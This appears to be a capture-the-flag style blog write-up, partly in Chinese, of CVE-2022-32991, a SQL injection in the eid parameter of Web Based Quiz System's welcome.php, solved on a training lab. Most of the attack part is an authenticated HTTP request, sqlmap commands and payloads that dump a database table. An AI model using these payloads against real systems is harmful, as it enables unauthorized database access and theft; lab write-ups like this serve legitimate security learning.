---
title: "CVE-2022-32991"
date: 2024-07-25
tags: ["春秋云镜","CVE","SQLi"]
featured_image: "https://static.guyu.pro/yunjing.ichunqiu.com/CVE.webp"
draft: false
---

<https://nvd.nist.gov/vuln/detail/CVE-2022-32991>

## Description 

Web Based Quiz System v1.0 was discovered to contain a SQL injection vulnerability via the eid parameter at welcome.php

## 演示

环境: [春秋云镜 免费空间>CVE-2022-32991](https://yunjing.ichunqiu.com/cve/detail/750)

### 1.登录

![](https://static.guyu.pro/yunjing.ichunqiu.com/750/1.webp)

尝试注册用户

![](https://static.guyu.pro/yunjing.ichunqiu.com/750/2.webp)

### 2.验证

<http://eci-2ze31109wu70m3ze6qhp.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141f1e8399e'&n=1&t=10>

![](https://static.guyu.pro/yunjing.ichunqiu.com/750/3.webp)

### 3.利用

因为要在已登录状态注入，需要带上cookie

![](https://static.guyu.pro/yunjing.ichunqiu.com/750/4.webp)

保存为750，在url地址参数`eid=5b141f1e8399e`后添加`*`，让sqlmap指定位置注入

```http

GET /welcome.php?q=quiz&step=2&eid=5b141f1e8399e*&n=1&t=10 HTTP/1.1
Host: eci-2ze31109wu70m3ze6qhp.cloudeci1.ichunqiu.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1721788611,1721803958; PHPSESSID=cnam4bkgd0a0so8md1bqj6qbnn
Connection: close
```

使用sqlmap注入

```bash
$ sqlmap -r 750
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://eci-2ze31109wu70m3ze6qhp.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141f1e8399e' AND 6069=6069 AND 'sWKv'='sWKv&n=1&t=10

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://eci-2ze31109wu70m3ze6qhp.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141f1e8399e' OR (SELECT 8600 FROM(SELECT COUNT(*),CONCAT(0x7170767871,(SELECT (ELT(8600=8600,1))),0x716a627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OiEz'='OiEz&n=1&t=10

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://eci-2ze31109wu70m3ze6qhp.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141f1e8399e' AND (SELECT 1465 FROM (SELECT(SLEEP(5)))egvA) AND 'lzIQ'='lzIQ&n=1&t=10

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: http://eci-2ze31109wu70m3ze6qhp.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=5b141f1e8399e' UNION ALL SELECT NULL,NULL,CONCAT(0x7170767871,0x51654f6951587a78465a5169726258774f6a646d644379745761756a4547746d794d4f7256734c6b,0x716a627871),NULL,NULL-- -&n=1&t=10
---
[23:26:07] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.2.20
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
$ sqlmap -r 750 --current-db
current database: 'ctf'
$ sqlmap -r 750 --tables -D ctf
[9 tables]
+-----------+
| admin     |
| history   |
| options   |
| rank      |
| user      |
| answer    |
| flag      |
| questions |
| quiz      |
+-----------+
$ sqlmap -r 750 --dump -D ctf -T flag
Database: ctf
Table: flag
[1 entry]
+--------------------------------------------+
| flag                                       |
+--------------------------------------------+
| flag{506b496e-2e73-473f-a206-ea9dba080930} |
+--------------------------------------------+
```

